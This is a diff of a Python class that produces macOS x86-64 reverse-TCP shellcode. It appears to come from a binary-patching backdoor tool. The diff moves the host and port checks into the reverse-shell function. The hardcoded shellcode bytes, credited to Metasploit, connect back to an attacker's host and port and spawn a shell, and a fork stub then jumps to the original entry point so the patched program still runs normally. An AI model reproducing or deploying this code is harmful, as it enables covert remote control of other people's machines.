@@ -48,9 +48,6 @@ class macho_intel64_shellcode():
 
     def pack_ip_addresses(self):
         hostocts = []
-        if self.HOST is None:
-            print "This shellcode requires a HOST parameter -H"
-            return False
         for i, octet in enumerate(self.HOST.split('.')):
                 hostocts.append(int(octet))
         self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
@@ -61,6 +58,13 @@ class macho_intel64_shellcode():
         return self.shellcode
 
     def reverse_shell_tcp(self):
+        if self.PORT is None:
+            print ("Must provide port")
+            return False
+        if self.HOST is None:
+            print ("This payload requires a HOST parameter -H")
+            return False
+
         #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
         self.shellcode2 = ("\xb8"
                            "\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49"
@@ -68,8 +72,7 @@ class macho_intel64_shellcode():
                            "\x00\x02"
                            )
 
-        self.shellcode2 += struct.pack(">h", self.PORT)  # "\x11\x5c"
-                      #192.168.1.12
+        self.shellcode2 += struct.pack(">h", self.PORT) 
         self.shellcode2 += self.pack_ip_addresses()
         self.shellcode2 += ("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                             "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
@@ -81,10 +84,8 @@ class macho_intel64_shellcode():
         self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
         self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
         if self.jumpLocation < 0:
-            #print 'jumping reverse:', hex(len(shellcode1) + 0xffffffff + jumpLocation)
             self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
         else:
-            #print 'jumplocation:', len(shellcode2) + jumpLocation
             self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)
 
         self.shellcode = self.shellcode1 + self.shellcode2
